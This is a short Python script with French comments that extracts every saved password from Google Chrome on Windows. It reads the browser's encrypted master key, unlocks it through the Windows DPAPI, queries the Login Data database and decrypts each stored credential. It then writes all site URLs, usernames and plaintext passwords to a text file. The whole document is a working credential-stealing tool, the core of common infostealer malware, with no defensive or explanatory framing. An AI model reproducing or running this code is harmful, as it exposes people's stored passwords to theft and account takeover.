import json
import base64
import sqlite3
from Cryptodome.Cipher import AES
import win32crypt
import os

def get_encryption_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    return win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]

def decrypt_password(ciphertext, key):
    iv = ciphertext[3:15]
    payload = ciphertext[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(payload)[:-16].decode()

# Obtention de la clé de cryptage
key = get_encryption_key()

# Chemin de la base de données de Chrome
db_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google",
                       "Chrome", "User Data", "Default", "Login Data")

# Connexion à la base de données
conn = sqlite3.connect(db_path)
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

# Ouvrir le fichier en mode écriture
with open("C:\\tmp\\passwords.txt", "w", encoding="utf-8") as file:
    for row in cursor.fetchall():
        url, username, encrypted_password = row
        decrypted_password = decrypt_password(encrypted_password, key)
        # Écrire les données dans le fichier
        file.write(f"Site: {url}\nUtilisateur: {username}\nMot de passe: {decrypted_password}\n\n")

# Fermeture de la connexion à la base de données
conn.close()

print("Les mots de passe ont été enregistrés dans 'passwords.txt'.")
